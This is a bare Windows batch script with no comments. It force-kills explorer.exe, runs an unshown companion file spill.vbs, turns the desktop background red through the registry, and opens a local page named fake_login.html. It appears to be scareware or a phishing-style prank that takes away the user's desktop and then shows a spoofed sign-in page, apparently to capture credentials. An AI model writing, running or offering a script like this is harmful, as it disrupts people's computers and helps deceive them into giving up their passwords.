@echo off
taskkill /f /im explorer.exe
start "" spill.vbs
timeout /t 5 >nul
reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start "" fake_login.html
exit
